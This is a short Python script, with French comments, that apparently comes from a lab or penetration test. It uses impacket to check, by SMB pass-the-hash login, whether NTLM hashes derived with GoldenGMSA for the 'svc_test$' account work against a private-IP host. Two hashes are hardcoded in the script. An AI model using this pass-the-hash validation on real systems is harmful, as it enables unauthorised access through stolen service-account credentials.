#!/usr/bin/env python3
"""
Script pour valider les hashes NTLM calculés par GoldenGMSA.
"""

from impacket.smbconnection import SMBConnection
import sys

def test_hash_ntlm(host, username, hash_ntlm, test_name):
    """Teste un hash NTLM en essayant de s'authentifier."""
    try:
        conn = SMBConnection(host, host)
        conn.login(username, '', '', '', hash_ntlm=hash_ntlm)
        print(f"✓ {test_name}: Hash NTLM VALIDE - Authentification SMB réussie")
        conn.logoff()
        return True
    except Exception as e:
        print(f"✗ {test_name}: Échec authentification SMB - {e}")
        return False

if __name__ == "__main__":
    host = "172.31.124.12"
    username = "svc_test$"
    
    # Hash du mode en ligne (test 5)
    hash_online = "c0c4058cba95fd028c947d0c65e8b19d"
    
    # Hash du mode hors ligne (test 4)
    hash_offline = "0379df1498875d2f6ac1d90e4c19fbab"
    
    print("=== Validation des hashes NTLM ===")
    print(f"Host: {host}")
    print(f"Username: {username}")
    print()
    
    result_online = test_hash_ntlm(host, username, hash_online, "Mode EN LIGNE")
    result_offline = test_hash_ntlm(host, username, hash_offline, "Mode HORS LIGNE")
    
    print()
    if result_online or result_offline:
        print("✓ Au moins un hash est valide")
        sys.exit(0)
    else:
        print("✗ Aucun hash n'est valide")
        sys.exit(1)

